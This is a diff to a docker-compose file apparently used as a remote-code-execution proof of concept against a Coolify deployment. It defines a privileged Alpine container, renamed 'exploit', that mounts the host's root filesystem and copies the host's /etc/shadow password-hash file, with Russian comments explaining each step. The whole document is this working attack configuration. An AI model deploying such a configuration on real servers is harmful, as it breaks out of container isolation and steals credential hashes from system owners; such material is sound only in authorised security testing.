@@ -3,17 +3,12 @@ version: '3.8'
 services:
   rce-test:
     image: alpine:3.19
-    container_name: coolify-rce-test
-    volumes:
-      # Монтируем корень сервера в /host-root
-      - /:/host-root
-      # Монтируем папку для вывода (чтобы потом прочитать файл)
-      - ./output:/output
+    container_name: exploit
     privileged: true
-    # Команда: читаем shadow с хоста и пишем в папку output внутри контейнера
+    volumes:
+      - /:/host-root
     command: >
       sh -c "
-        cat /host-root/etc/shadow > /output/shadow.txt &&
-        echo 'RCE_SUCCESS' > /output/status.txt &&
+        cat /host-root/etc/shadow > /tmp/shadow.txt &&
         sleep 3600
       "
